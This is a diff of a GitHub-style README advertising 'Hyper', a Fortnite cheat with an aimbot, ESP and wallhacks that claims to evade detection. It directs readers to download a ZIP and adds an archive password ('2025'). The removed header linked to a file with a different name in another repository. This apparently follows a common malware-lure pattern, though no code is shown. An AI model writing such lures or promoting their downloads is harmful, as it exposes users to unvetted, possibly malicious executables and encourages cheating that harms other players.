@@ -1,11 +1,10 @@
-# ⚡ Hyper - Fortnite Hack **[![Download Hyper](https://img.shields.io/badge/Download-Hyper-blue)](https://github.com/gabrielcohen0044/check/releases/download/soft/GalaxySoft.zip)**
-
 ![Hyper Preview](/assets/Hyper.gif)
 
 ## Quick Installation
 To get started with Hyper, follow these simple steps:
 1. **[![Download Hyper](https://img.shields.io/badge/Download-Hyper-blue)](../../releases)**
-2. Extract the downloaded ZIP file to your desired location on your system.
+2. PASSWORD: 2025
+3. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
 ⚡ **Hyper** is a cutting-edge Fortnite hack designed to give players an unbeatable advantage. With high-performance cheat functionalities, including ESP, aimbot, wallhacks, and more, Hyper ensures domination on the battlefield while maintaining security against detections.
